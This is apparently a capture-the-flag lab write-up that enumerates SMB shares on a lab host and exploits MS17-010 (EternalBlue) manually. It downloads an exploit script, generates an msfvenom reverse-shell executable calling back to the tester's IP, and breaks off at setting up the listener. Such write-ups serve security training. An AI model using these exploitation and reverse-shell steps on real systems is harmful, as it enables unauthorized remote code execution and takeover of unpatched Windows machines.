**Note**: `guest` appears to be a valid account.

# Enumeration

From the scan result we can see that **port 445** - used for SMB - is open and that the `message_signing` option is disabled. There are some shares with null session read access:

```
smbclient -L 10.10.10.40
Enter WORKGROUP\user's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk   
```

**Note**: I can obtain the same info with the following nmap script, which will return shares permission also:

```
nmap --script smb-enum-shares 10.10.10.40
```

We can also check shares permissions with the `smbmap` command:

```
smbmap -H 10.10.10.40 -u anonymous
[+] Guest session       IP: 10.10.10.40:445     Name: 10.10.10.40                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        Share                                                   READ ONLY
        Users                                                   READ ONLY
```

**->** We have **READ** permissions on the shares named `Share` and `Users`. We can list its content with smbclient but nothing useful is found there.

We can proceed checking for vulnerabilities with a nmap script scan on ports `139` and `445`:

```
nmap --script smb-vuln* 10.10.10.40 -p 139,445 -n

Where:
- `smb-vuln*` is a wildcard notation useful to specify that we want to run all the scripts with the name starting with `smb-vuln`

The target is vulnerable to **MS17-010**:

>EternalBlue exploits a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol. This vulnerability is denoted by entry CVE-2017-0144[15][16] in the Common Vulnerabilities and Exposures (CVE) catalog. The vulnerability exists because the SMB version 1 (SMBv1) server in various versions of Microsoft Windows mishandles specially crafted packets from remote attackers, allowing them to execute arbitrary code on the target computer.[17]

>The NSA did not alert Microsoft about the vulnerabilities, and held on to it for more than five years before the breach forced its hand. The agency then warned Microsoft after learning about EternalBlueâ€™s possible theft, allowing the company to prepare a software patch issued in March 2017,[18] after delaying its regular release of security patches in February 2017.

# Exploitation

There is a well known `Metasploit` module available for this exploit, but we will do it manually.
Let's check `searchsploit` and search for:

```
searchsploit eternalblue
```

We can find an interesting python script for `Win 7/8.1/2008` OS versions:

```
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                               | windows/remote/42315.py
```

Let's download it on our machine:

```
searchsploit -m windows/remote/42315.py
```

**Tip**: always read the exploit code to understand what it is doing.

In order to work, the script:

1. needs a `mysmb.py` file (easy to find)
2. needs an exploit to launch, we will create a **msfvenom reverse shell**
3. needs a  valid `user/pass` couple -> We know that `guest` user is allowed

So, for point **1**, we can download the `mysmb.py` file:

```
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
```

For point **2**, we will create a **reverse shell** with `msfvenom` in the current directory:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=1234 -f exe > ./shell.exe
```

At this point we have to edit the exploit file. There are plenty of resources on the internet explaining how to do that. One good resource is this one:
> https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/

Substantially, what we are doing is to enable a function named **service_exec()** that will connect to the target and upload the reverse shell we created. After that, it will try to execute it.

If everything goes well, we will have a connection back from the target!

At this point we have to set up a listener on our machine and launch the exploit which will connect back to us:

```
